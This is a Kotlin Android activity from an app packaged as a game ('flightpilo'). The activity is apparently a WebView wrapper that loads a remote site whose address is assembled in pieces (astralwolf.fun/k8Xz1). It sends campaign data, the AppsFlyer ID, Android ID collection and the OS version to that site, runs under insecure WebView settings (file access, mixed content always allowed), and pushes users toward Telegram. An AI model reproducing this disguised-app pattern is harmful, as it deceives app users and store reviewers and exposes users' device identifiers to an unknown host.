package com.fungames.flightpilo.back

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import android.webkit.*
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.appsflyer.AppsFlyerLib
import com.fungames.flightpilo.R
import com.fungames.flightpilo.back.Cnst.CAMPL1
import com.fungames.flightpilo.back.Cnst.CAMPL2
import com.fungames.flightpilo.back.Cnst.CAMPL3
import com.fungames.flightpilo.back.Cnst.DEEPL1
import com.fungames.flightpilo.back.Cnst.DEEPL2
import com.fungames.flightpilo.back.Cnst.DEEPL3
import com.orhanobut.hawk.BuildConfig
import com.orhanobut.hawk.Hawk
import java.io.File
import java.io.IOException

class View : AppCompatActivity() {

    private val TAGW: String = this::class.java.simpleName
    private val FILECHOOSERRESULTCODE = 1

    // the same for Android 5.0 methods only
    var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    var mCameraPhotoPath: String? = null
    lateinit var view1: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_view)

        view1 = findViewById(R.id.MHView)

        Toast.makeText(this, "Loading...", Toast.LENGTH_LONG).show()

        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        cookieManager.setAcceptThirdPartyCookies(view1, true)
        webSettings()

        val activity: Activity = this

        view1.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {


                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (appInstalledOrNot(url)) {
                        Log.d("devx", "ffff")

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.setData(Uri.parse(url))
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)

            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                //Save the last visited URL
                saveUrl(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(activity, description, Toast.LENGTH_SHORT).show()
            }
        }
        view1.loadUrl(getUrl())
        val permission = Manifest.permission.CAMERA
        val grant = ContextCompat.checkSelfPermission(this, permission)
        if (grant != PackageManager.PERMISSION_GRANTED) {
            val permissionlist = arrayOfNulls<String>(1)
            permissionlist[0] = permission
            ActivityCompat.requestPermissions(this, permissionlist, 1)
        }

        view1.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                mFilePathCallback?.onReceiveValue(null)
                mFilePathCallback = filePathCallback
                var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (takePictureIntent!!.resolveActivity(packageManager) != null) {

                    // create the file where the photo should go
                    var photoFile: File? = null
                    try {
                        photoFile = createImageFile()
                        takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                    } catch (ex: IOException) {
                        // Error occurred while creating the File
                        Log.e(
                            TAGW,
                            "Unable to create Image File",
                            ex
                        )
                    }

                    // continue only if the file was successfully created
                    if (photoFile != null) {
                        mCameraPhotoPath = "file:" + photoFile.absolutePath
                        takePictureIntent.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(photoFile)
                        )
                    } else {
                        takePictureIntent = null
                    }
                }
                val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
                contentSelectionIntent.type = "image/*"
                val intentArray: Array<Intent?> =
                    takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val chooserIntent = Intent(Intent.ACTION_CHOOSER)
                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
                chooserIntent.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser))
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
                startActivityForResult(
                    chooserIntent, FILECHOOSERRESULTCODE
                )
                return true
            }

            // creating image files (Lollipop only)
            @Throws(IOException::class)
            private fun createImageFile(): File {
                var imageStorageDir = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageStorageDir.exists()) {
                    imageStorageDir.mkdirs()
                }

                // create an image file name
                imageStorageDir =
                    File(imageStorageDir.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageStorageDir
            }

        }


    }


    private fun webSettings() {
        val webSettings = view1.settings
        webSettings.javaScriptEnabled = true

        webSettings.useWideViewPort = true

        webSettings.loadWithOverviewMode = true
        webSettings.allowFileAccess = true
        webSettings.domStorageEnabled = true

        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.setSupportMultipleWindows(false)

        webSettings.displayZoomControls = false
        webSettings.builtInZoomControls = true
        webSettings.setSupportZoom(true)

        webSettings.pluginState = WebSettings.PluginState.ON
        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webSettings.setAppCacheEnabled(true)

        webSettings.allowContentAccess = true
    }


    private fun getUrl(): String {
        val spoon = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE)

        val mainid: String = Hawk.get(Cnst.MAIN_ID)

        val cpOne: String? = Hawk.get(CAMPL1)
        val cpTwo: String? = Hawk.get(CAMPL2)
        val cpThree: String? = Hawk.get(CAMPL3)

        val dpOne: String? = Hawk.get(DEEPL1)
        val dpTwo: String? = Hawk.get(DEEPL2)
        val dpThree: String? = Hawk.get(DEEPL3)


        val pack = "com.fungames.flightpilo"

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val one = "sub_id_1="
        val two = "sub_id_2="
        val three = "sub_id_3="
        val four = "sub_id_4="
        val five = "sub_id_5="
        val six = "sub_id_6="
        val seven = "sub_id_7="


        val first = "https://"
        val second = "astralwolf.fun/k8Xz1"

        val androidVersion = android.os.Build.VERSION.RELEASE

        val resultAB = first + second
        var after = ""
        if (cpOne != null) {
            after =
                "$resultAB?$one$cpOne&$two$cpTwo&$three$cpThree&$four$pack&$five$afId&$six$mainid&$seven$androidVersion"

        } else {
            after =
                "$resultAB?$one$dpOne&$two$dpTwo&$three$dpThree&$four$pack&$five$afId&$six$mainid&$seven$androidVersion"

        }
//      deprecated  val after = "$resultAB?$one$cpOne&$two$cpTwo&$three$cpThree&$four$dpOne&$five$dpTwo&$six$dpThree&$seven$pack&$eight$afId&$nine$mainid&$ten$androidVersion"

        Log.d("TESTAG", "Test Result $after")
        return spoon.getString("SAVED_URL", after).toString()
    }

    private fun appInstalledOrNot(uri: String): Boolean {

        val pm = packageManager
        try {
            Log.d("devx", uri)

            pm.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != FILECHOOSERRESULTCODE || mFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var results: Array<Uri>? = null

        // check that the response is a good one
        if (resultCode == RESULT_OK) {
            if (data == null || data.data == null) {
                // if there is not data, then we may have taken a photo
                results = arrayOf(Uri.parse(mCameraPhotoPath))
            } else {
                val dataString = data.dataString
                if (dataString != null) {
                    results = arrayOf(Uri.parse(dataString))
                }
            }
        }
        mFilePathCallback?.onReceiveValue(results)
        mFilePathCallback = null
    }


    private var doubleBackToExitPressedOnce = false

    override fun onBackPressed() {


        if (view1.canGoBack()) {
            if (doubleBackToExitPressedOnce) {
                view1.stopLoading()
                view1.loadUrl(firstUrl)
                //Toast.makeText(applicationContext, "attemt loading $firstUrl", Toast.LENGTH_LONG).show()
            }
            this.doubleBackToExitPressedOnce = true
            view1.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                doubleBackToExitPressedOnce = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }

    var firstUrl = ""
    fun saveUrl(url: String?) {
        if (!url!!.contains("t.me")) {

            if (firstUrl == "") {
                firstUrl = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val sp = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE)
                val editor = sp.edit()
                editor.putString("SAVED_URL", url)
                editor.apply()
            }
        }
    }
}